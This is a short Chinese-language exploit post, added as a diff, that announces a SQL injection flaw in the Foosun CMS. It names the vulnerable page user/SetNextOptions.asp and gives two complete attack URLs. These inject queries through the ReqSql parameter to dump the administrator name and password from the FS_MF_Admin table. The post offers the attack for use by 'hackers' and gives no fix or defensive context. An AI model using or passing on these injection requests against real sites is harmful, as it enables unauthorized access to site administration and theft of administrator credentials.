@@ -1,0 +1,10 @@
+foosun最新SQL注入漏洞爆管理员帐号密码
+
+[foosun最新SQL注入漏洞爆管理员帐号密码 全文]foosun最新SQL注入漏洞爆管理员帐号密码
+风讯foosun的注册文件存在漏洞。黑客们可以暴管理员帐号和密码。
+漏洞文件：http://www.sitedirsec.com/user/SetNextOptions.asp
+利用简单的方法：
+暴管理员帐号：
+http://www.sitedirsec.com/user/SetNextOptions.asp?sType=1&EquValue=aaaa&SelectName=aaa&ReqSql=select+1admin_name345678++from+FS_MF_Admin 
+暴管理员密码：
+http://www.sitedirsec.com/user/SetNextOptions.asp?sType=1&EquValue=aaaa&SelectName=aaa&ReqSql=select+1admin_pass_word345678++from+FS_MF_Admin 
